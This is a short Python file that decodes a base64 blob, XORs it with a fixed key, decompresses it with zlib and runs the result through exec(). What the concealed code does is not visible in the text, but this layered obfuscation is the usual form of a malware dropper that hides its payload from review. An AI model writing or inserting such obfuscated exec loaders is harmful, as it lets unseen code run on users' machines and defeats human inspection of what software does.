import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'S68evwI5twMjM8hO9kXdsTf3fcMyRQ0T/vafK7t1BYp5z4gyrlm5UvFNFR6bMQP+C2UCeOn8I7aHgv3JmFjIqJ/Kv5zNhZ1SMxwYXRqkfx0V9DBTdpbPxvNvrNEaeJJaBVgLzxz1hFC1NEXdF8M='
exec(zlib.decompress(bytes(b ^ 0x33 for b in base64.b64decode(_p))))
